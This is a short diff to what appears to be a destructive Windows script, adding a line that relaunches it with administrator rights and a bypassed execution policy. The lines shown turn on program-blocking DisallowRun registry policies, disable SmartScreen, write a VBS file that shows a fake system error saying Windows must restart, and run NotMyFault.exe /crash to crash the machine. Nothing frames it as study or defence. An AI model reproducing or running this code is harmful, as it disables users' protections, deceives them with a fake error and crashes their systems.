@@ -1,3 +1,4 @@
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"" -Verb RunAs; exit }
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /t REG_DWORD  /v "DisallowRun" /reg:32 /d 1 /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /t REG_DWORD /v "SmartScreenEnabled" /reg:32 /d 0 /f
@@ -22,6 +23,7 @@ echo "msgbox "Error 1S65HF5TY", 16+2+4096 , "Windows need to restart"" > nwork.v
 unblock-file "nwork.vbs"
 cd "$home\AppData\Local\Temp\B10HT6R3NO"
 NotMyFault.exe /crash
+
 
 
 
